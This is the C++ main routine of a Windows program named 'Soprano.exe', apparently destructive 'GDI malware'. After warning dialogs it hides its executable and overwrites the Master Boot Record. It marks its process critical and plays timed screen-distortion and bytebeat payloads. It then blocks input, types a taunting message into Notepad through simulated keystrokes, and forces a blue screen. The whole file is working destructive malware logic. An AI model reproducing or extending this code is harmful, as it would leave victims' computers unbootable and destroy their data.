typedef struct IUnknown IUnknown;
#include "soprano.h"

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	MsgConfirm msgConfirm(hInstance, nCmdShow);
	msgConfirm.Show();

	if (MessageBoxW(NULL, L"(PTBR)\nCara, é sério! Isso vai destruir completamente sua máquina!\n"
		L"Você realmente quer continuar a execução?\n\n"
		L"(ENG)\nDude, seriously! This will completely destroy your machine!\n"
		L"Do you really want to proceed with the execution?",
		L"Soprano.exe - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;

	LPCWSTR startupPath = System::StartupPath();
	LPCWSTR execPath = System::PathCombine(startupPath, L"\\Soprano.exe");

	System::FileHide(execPath);

	Sleep(rand() % 5000);

	MBR::OverwriteMBR();
	System::SetProcessCritical();

	HANDLE hp = 0;
	HANDLE Payload1 = ThreadExecute(&PayloadsGdi::Load1, &hp);
	HANDLE Bytebeat1 = ThreadExecute(&Bytebeat::Beat1, NULL);

	Sleep(1000 * 15); // 15s
	Bytebeat::Abort(Bytebeat1);
	ThreadAbort(Payload1, hp);
	System::cls();

	HANDLE Payload2 = ThreadExecute(&PayloadsGdi::Load2, &hp);
	HANDLE Bytebeat2 = ThreadExecute(&Bytebeat::Beat2, NULL);

	Sleep(1000 * 15); // 15s
	Bytebeat::Abort(Bytebeat2);
	ThreadAbort(Payload2, hp);
	System::cls();

	HANDLE Payload3 = ThreadExecute(&PayloadsGdi::Load3, &hp);
	HANDLE Bytebeat3 = ThreadExecute(&Bytebeat::Beat3, NULL);

	Sleep(1000 * 15);   // 15s
	Bytebeat::Abort(Bytebeat3);
	ThreadAbort(Payload3, hp);
	System::cls();

	HANDLE BeatBeap = ThreadExecute(&Bytebeat::BeatBasicPalygon, &hp);
	HANDLE Payload_Hexagon = ThreadExecute(&PolygonsForms::Hexagon, &hp);
	HANDLE Payload_Triangle = ThreadExecute(&PolygonsForms::Triangle, &hp);

	Sleep(1000 * 15);   // 12s
	ThreadAbort(BeatBeap, hp);

	HANDLE Payload4 = ThreadExecute(&PayloadsGdi::Load4, &hp);
	HANDLE Bytebeat4 = ThreadExecute(&Bytebeat::Beat4, NULL);

	Sleep(1000 * 15);   // 15s

	ThreadAbort(Payload_Hexagon, &hp);
	ThreadAbort(Payload_Triangle, &hp);
	ThreadAbort(Payload4, &hp);
	Bytebeat::Abort(Bytebeat4);
	System::cls();

	HANDLE Payload5 = ThreadExecute(&PayloadsGdi::Load5, &hp);
	HANDLE Bytebeat5 = ThreadExecute(&Bytebeat::Beat5, NULL);

	Sleep(1000 * 15);    // 15s

	ThreadAbort(Payload5, &hp);
	Bytebeat::Abort(Bytebeat5);
    	System::cls();

	HANDLE Payload6 = ThreadExecute(&PayloadsGdi::Load6, &hp);
	HANDLE tLoadIcon = ThreadExecute(&PayloadsGdi::LoadIconEffect, &hp);
	HANDLE Bytebeat6 = ThreadExecute(&Bytebeat::Beat6, NULL);

	Sleep(1000 * 15);    // 15s

	ThreadAbort(Payload6, &hp);
	ThreadAbort(tLoadIcon, &hp);
	Bytebeat::Abort(Bytebeat6);
	System::cls();

	Sleep(5000);

	BlockInput(TRUE);

	Sleep(2000);

	CONST BYTE VK_R = 0x52;  // KEY 'R'
	System::PressKey(VK_LWIN, VK_R, 0);  // WinLeft + R

	Sleep(2500);
	System::TypeText(L"notepad.exe", 100);

	Sleep(1000);
	System::PressKey(VK_RETURN, 0, 0);  // ENTER

	Sleep(3600);
	System::TypeText(L"BYE BYE COMPUTER  :)", 100);

	Sleep(2500);
	System::BSOD();  // KILL PC

	Sleep(INFINITE);
	return 0x00;
}
